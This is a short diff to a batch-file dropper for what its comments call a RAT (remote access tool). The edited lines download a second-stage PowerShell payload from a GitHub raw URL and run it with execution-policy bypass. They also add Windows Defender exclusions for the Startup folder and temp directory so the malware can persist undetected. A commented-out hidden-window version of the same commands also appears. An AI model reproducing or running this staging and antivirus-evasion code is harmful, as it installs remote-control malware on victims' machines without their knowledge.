@@ -34,7 +34,9 @@ REM a VBScript to prompt for admin rights, then delete itself.
 REM rat resources
 REM ; to execute quicker
 
-powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/tarasermolenko/RemoteAccessTool/refs/heads/main/payloads/stage2.ps1 -OutFile stage2.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; Add-MpPreference -ExclusionPath "$env:temp"
+powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/tarasermolenko/RemoteAccessTool/refs/heads/main/payloads/stage2.ps1 -OutFile stage2.ps1"
+Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+Add-MpPreference -ExclusionPath "$env:temp"
 powershell powershell.exe -ep bypass -debug ./stage2.ps1
 
 REM powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/tarasermolenko/RemoteAccessTool/refs/heads/main/payloads/stage2.ps1 -OutFile stage2.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; Add-MpPreference -ExclusionPath "$env:temp"
